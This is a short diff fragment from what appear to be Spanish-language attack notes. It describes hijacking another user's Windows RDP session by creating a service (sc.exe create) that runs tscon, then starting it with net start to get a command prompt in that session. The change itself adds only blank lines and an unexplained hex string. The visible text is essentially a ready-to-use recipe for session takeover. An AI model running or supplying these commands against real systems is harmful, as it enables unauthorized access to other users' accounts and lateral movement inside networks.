@@ -19,3 +19,7 @@ sc.exe create sessionhijack binpath= "cmd.exe /k tscon <user_id_a_impersonar> /d
 
 luego iniciamos el servicio y se va a abrir un cmd con la sesión del usuario:
 net start sessionhijack
+
+
+
+0E14B9D6330BF16C30B1924111104824
